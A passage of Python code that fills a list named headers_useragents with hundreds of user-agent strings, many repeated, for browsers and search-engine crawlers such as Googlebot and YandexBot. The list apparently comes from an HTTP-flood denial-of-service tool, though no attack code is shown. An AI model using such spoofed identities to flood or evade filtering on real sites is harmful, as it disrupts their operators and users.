        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append(
        'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append(
        'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append(
        'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append(
        'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    headers_useragents.append(
        'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    headers_useragents.append(
        'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    headers_useragents.append(
        'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Googlebot/2.1 (http://www.googlebot.com/bot.html)')
    headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    headers_useragents.append(
        'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append(
        'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append(
        'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append(
        'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append(
        'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    headers_useragents.append(
        'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    headers_useragents.append(
        'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    headers_useragents.append(
        'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append(
        'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append(
        'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append(
        'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append(
        'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    headers_useragents.append(
        'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    headers_useragents.append(
        'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    headers_useragents.append(
        'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
    headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
    headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
    headers_useragents.append(
        'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
    headers_useragents.append(
        'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    headers_useragents.append(
